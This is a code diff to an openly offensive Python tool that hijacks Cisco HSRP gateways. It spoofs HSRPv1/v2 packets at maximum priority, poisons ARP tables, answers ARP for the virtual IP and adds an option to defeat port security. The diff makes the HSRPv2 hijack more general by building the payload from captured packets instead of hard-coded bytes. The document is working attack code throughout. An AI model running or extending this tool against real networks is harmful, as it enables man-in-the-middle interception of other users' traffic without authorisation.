@@ -12,15 +12,15 @@ import httpgrabber
 # change as necessary
 interface = "eth0"
 
-# Default false. option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
+# Default False. option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
 # can be toggled at runtime by typing "poison"
 poisonrouter = False
 
-# Default true. only poison for packets of interest, when poisonrouter set to True
+# Default True. only poison for packets of interest, when poisonrouter set to True
 # see arp_poison() for rules
 silentmode = True
 
-# Default true. option to force use of own mac address only when sending hsrp and arp packets
+# Default True. option to force use of own mac address only when sending hsrp and arp packets
 attackportsecurity = True
 
 # Default False. perform nat translation for all received packets before forwarding to router. poisonrouter should be set to False when translateip set to True
@@ -54,6 +54,11 @@ version: int
 pkcopy: Packet
 timekeeper = {}
 commandlist = []
+
+# hsrpv2 variables
+# hello time (secs)
+v2hellotime = 3
+
 # for suppressing output
 suppress = False
 # not in use
@@ -116,13 +121,15 @@ def check_hsrp(packet):
         ethersrc = packet[Ether].src
         # TODO to improve on HSRPv2 detection, currently based on source mac address only and fails if standby group number changes, someone work on this pls thanks
         ########################################
-        if ethersrc == "00:00:0c:9f:f0:01":
+        gp = hex(packet['HSRP'].reserved)[2:].zfill(3)
+        gp = gp[:1] + ':' + gp[1:]
+        if packet['Ethernet'].src == "00:00:0c:9f:f" + gp:
             if attackstarted:
                 srcip = packet[IP].src
                 if srcip != myip:
                     hsrpfound = True
                 return
-            print("HSRPv2 found")
+            print("[INFO] Active HSRP found, version 2")
             version = 2
             hsrpfound = True
             pkcopy = packet
@@ -143,6 +150,8 @@ def check_v1_fields(packet):
         assert packet[HSRP].state == 16
         # check correct destination ip
         assert packet[IP].dst == "224.0.0.2"
+        # check correct mac
+        assert packet[Ether].src[:15] == "00:00:0c:07:ac:"
     except:
         # not valid if any assert fails
         return False
@@ -191,16 +200,25 @@ def send_hsrp(packet):
         sendp(pkt, inter=packet[HSRP].hellotime, loop=1, verbose=False)
     else:
         # TODO Extract bytes from HSRP packet using script, do not hard code HSRP bytes. Someone work on this pls thanks
-        payloadHSRP = b'\x02\x00\x06\x04\x00\x01\x5c\x71\x0d\xbd\x87\xc7\x00\x00\x00\xff\x00\x00\x0b\xb8\x00\x00\x27\x10\xc0\xa8\x01\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        payloadText = b'cisco\x00\x00\x00'
         ###################################
         eth = Ether(src=ethersrc, dst=etherdst)
-        ip = IP(src=myip, dst="224.0.0.102", len=80, ttl=ipttl)
+        ip = IP(src=myip, dst=ipdst, len=80, ttl=ipttl)
         udp = UDP(sport=sport, dport=dport, len=60)
-        groupTlv = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
-        textTlv = IPv6ExtHdrSegmentRoutingTLV(type=3, len=8, value=payloadText)
+        #HSRPv2 variables
+        hellotime = 3000
+        holdtime = 10000
+        op = 0
+        st = 6
+        ver = 2
+        priority = 255
+        id = packet['HSRP'].auth
+        grp = packet['HSRP'].reserved
+        virtIP = packet['HSRP MD5 Authentication'].sourceip
+        auth = packet['HSRP MD5 Authentication'].authdigest
+        payloadHSRP = ver.to_bytes(1,'big') + op.to_bytes(1,'big') + st.to_bytes(1, 'big') + b'\x04' + grp.to_bytes(2,'big') + id + priority.to_bytes(2,'big') + hellotime.to_bytes(4,'big') + holdtime.to_bytes(4,'big') + bytes(map(int, virtIP.split('.'))) + bytes(4) + auth + bytes(2)
+        hsrp = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
         # Start sending spoofed HSRP and ARP packet
-        pkt = eth/ip/udp/groupTlv/textTlv
+        pkt = eth/ip/udp/hsrp
         print("Hijacking HSRPv2...")
         sendp(pkt, verbose=False)
         send_initial_arp(0, False)
@@ -217,7 +235,13 @@ def send_hsrp(packet):
 def send_initial_arp(type, pause=True):
     '''Send arp with HSRP virtual ip to redirect local traffic to attacker. 
     
-    Can choose to send as broadcast or send to stp uplinkfast based on arguments'''
+    Can choose to send as broadcast or send to stp uplinkfast based on arguments
+    
+    Arguments: 
+    
+    type: type of ARP packet to send, 0: broadcast, 1: STP uplinkfast
+    
+    pause: whether to pause for duration of HSRP hellotime'''
     if attackportsecurity:
         ethersrc = mymac
     else:
@@ -228,8 +252,8 @@ def send_initial_arp(type, pause=True):
         hellotime = pkcopy[HSRP].hellotime
     elif version == 2:
         ################
-        virtualIP = "192.168.1.254"
-        hellotime = 3
+        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
+        hellotime = v2hellotime
     if type == 0:
         etherdst = "ff:ff:ff:ff:ff:ff"
     elif type == 1:
@@ -249,7 +273,7 @@ def start_arp_responder(packet):
         virtualIP = packet[HSRP].virtualIP
     elif version == 2:
         ########################
-        virtualIP = "192.168.1.254"
+        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if debug:
         print(f"[DEBUG] Responding to ARP requests for {virtualIP}")
     filterstring = f"arp and (arp[6:2] = 1) and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
@@ -261,7 +285,7 @@ def arp_respond(packet):
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
         #####################
-        virtualIP = "192.168.1.254"
+        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if attackportsecurity:
         ethersrc = mymac
     else:
@@ -300,7 +324,7 @@ def arp_poison(packet):
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
         ###########################
-        virtualIP = "192.168.1.254"
+        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     try:
         victimIP = packet[IP].src
         # keep track of time since last arp packet sent, skip if arp has been sent in the past x seconds, chosen at random between 10 and 20 seconds
@@ -403,7 +427,7 @@ def start_subinterface():
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
         #######################
-        virtualIP = "192.168.1.254"
+        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if debug:
         print(f"Starting sub interface with IP: {virtualIP} on {interface}")
     subprocess.run(f"ifconfig {interface}:1 {virtualIP} netmask {mynetmask} up".split())
@@ -437,7 +461,7 @@ def delayed_failure_check():
         hellotime = pkcopy[HSRP].hellotime
     elif version == 2:
         ####################
-        hellotime = 3
+        hellotime = v2hellotime
     # will change hsrpfound to true if active hsrp found
     check_fail = threading.Thread(target=find_hsrp, daemon=True)
     check_fail.start()
